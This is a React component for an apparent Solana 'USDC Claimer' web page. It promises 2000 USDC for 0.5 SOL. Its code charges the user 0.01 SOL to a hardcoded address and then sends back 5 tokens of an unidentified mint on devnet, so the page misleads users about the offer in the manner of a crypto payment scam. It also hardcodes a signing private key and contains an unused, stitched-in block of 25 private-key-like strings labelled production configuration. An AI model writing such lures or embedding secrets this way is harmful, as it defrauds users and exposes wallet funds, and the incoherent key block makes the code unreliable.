/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "3QqV4phzXJaqiXQRzTgQ66g3SYzwbrQ965qC1v1WYJ1a9L72AQQFTe67VvTQdVZjduZxewbYWK3vizusWAL8YbnW"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2c4BoUaRxEuBCwNsaweFSrSMfiS9Uwu8JjzxUZ1hh7C6L4aTK8K3j1WZv5W9fNiisWQtpDmowBU3RZG6rfeR1WCV",
  "key1": "3WPTeCK3wcQ3Aj6EEheARcQ83b7skCq9SP4w3uC3cRgn2YprhhKm66crCKHiffxhE2Lhv2YfugfevuVuxmKjDNfq",
  "key2": "2JNYSqHzvvseaayBZsk1BihiDw5CsfTJwKH6T6XfDs1jncR7feGhys8sCp4J6iJuXH3YfFEpgfFdxvMGi4k5zQLP",
  "key3": "4NUpdZ1hug9wErSdkKoNC4ZGY564KnHU9C9ESqUq83McWNFETqc75DRCxJJy6bE8u6VnkWKzGMDmrez8SC3p1z5R",
  "key4": "5czxf6uDj9UaJWR2jL5mw2S1PUAHZdVDwbvuN9yuCoA6k134B8wJgJ1eGLByonspSMk7tN8GjPZdyfnZtzfF7Np3",
  "key5": "4ijJJeZ6BNbCf285asRWgcakwVQRBF1pNFQu6W5s5wLPzU1HqzH6g3sQbm9t1KX7h62TBV7iFsJJR9TRaViHkDZ1",
  "key6": "5272mYqk1Sa17neq8Nbza7tfjnXT8tYW9cPs3mC75gkby644V7FmVDu95Hb7ieHpVmgtGMeKaqG1H2z4pyDxu4Dq",
  "key7": "2XTTaySy1E1Sjcqy4WqXkvBqi6eRxaH3sM81AmFKVM5idhakLxegWFGGpWMALhrXhJvSDJ4ajB5w2stA96pae2m6",
  "key8": "3wQMzsm6pXnGB5bPxmGHeyVvAbkydzVJazBDbhPWBvzsymDMuyd9HdbCNiRHKUWL5dFjz3uUVwXaAG9bw2esnVdM",
  "key9": "4avigoRvmj1H2a1TTWtWU9qkYPB4R48Etv9HK6r2CAMPTut2emyEHgRQBodLhRg5aULoYoJth9nmcN7Hdpco2MgM",
  "key10": "23HoK8pTwDzL6rmme9Tv3F3yXoHeLa5fECpuwBrjuraA6sGai4pfMeQeNA2pYmTpJdwY8LR7Xb4HxfxZ79RhE3WP",
  "key11": "2iZFRKaGnwWPkuPiP2St8E2zNKdfQ9Z5ja82dASuUaTF1As85nC3Qfkd46W731tHFaocqJvemVSp2gEuQ8STU5PF",
  "key12": "447E16bhhuLSCdAcrEGbk7Jrmgb725kzEwqmcCGh13dhPRd4oiy15JpjEsuT3KKSpSFCqsDcnztpQYtyp2WjibNS",
  "key13": "3TiF5N2F6BYspNyLcHyEPYc6Noi2zVJ7GAQwKscvKCs3ErL9QaR1xWiUhm2xMSuGk97q6NjRNuVjEZa1WQybCNc1",
  "key14": "5jjBnZCNbwER5Dx4m17jFoQQsKcYPKdYz51hmZU8tsCeYxqcPTP3u95xEgyVpE4mEr6TM6RWcs3mDSxXvzJWcdbJ",
  "key15": "65v3cxT9Pm3MGwNWiCULQVtqKYN9ikZ4rKH5s5FvFyPwWnGu7FTiKPpfxLeQGg6tx41ZRFMEuuUiv3XdhLQnJD8J",
  "key16": "hcFB5v17QSFc9T7B3trBhpRBdDTBoB8YmwVCnZ8E1JGukwQZgEnQefVYkZEEURXj3imzVdxJnFuBiRcbdzWzC6N",
  "key17": "47fZ4GLmyP2QrcKmG2pbLzHMarSaj2gHLtzLdFhFquo4ZGuaXoTroTfMg5ZQYWwuCYSGGP5RrzAxMpWGppxJn8cB",
  "key18": "3JkoBZh9MkGj3YPv4fF5ZszcvxakcPSA1VyMrr4QWEhj12msRPJid7qGRowjhHTryuXT6JgdnFhpZri7f5Di3GQv",
  "key19": "31YaG2JjuGpVxgwkQ89Q7BSWwSGB758vbankHgDy9V9u3BteFWubV6SR6NJ1DnCLDsw5J6DkDJETNoEoZ5GbRijV",
  "key20": "2MEJ5DHtF5dHJ3SGDWCkxyDRnJeKaLgATLeBVqmxsjqPCpdzMqot86bseNNcrpVvH2poXiWpGS6N3c9DGqGLViHU",
  "key21": "47so2jXKczr1pZTACmYHrjEwSY2tddmjfcChCo4QhPVYGBhw7iiSUeVzWmDCxFEaqJWkKLizyLGejTwfYtxZEFmb",
  "key22": "V4Q8rrfE8ZN1NGupQZM2oGhiqu14di2FBFkG8A4oEQ437QRcZ7tXRvZ9DNhrSV5obU8urzWXTvk9LNFDNV4ZfqK",
  "key23": "nsHcAeRCGLJoJDPZJ5xSbEQiSXwtYYMWkFGwCLUgNyKyn6K2sqWiRNFgsNjdgkbKkSotT5PGpDkofBhwtkdxcvH",
  "key24": "HUo5MGmVC1i4eBv1NLixGXng81yncEWx9S1Jjy6qW6HgzjNJ9Si1R1sLX1gGQYuKXRoGVQgxJ5HYNxm4mJfrchD"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
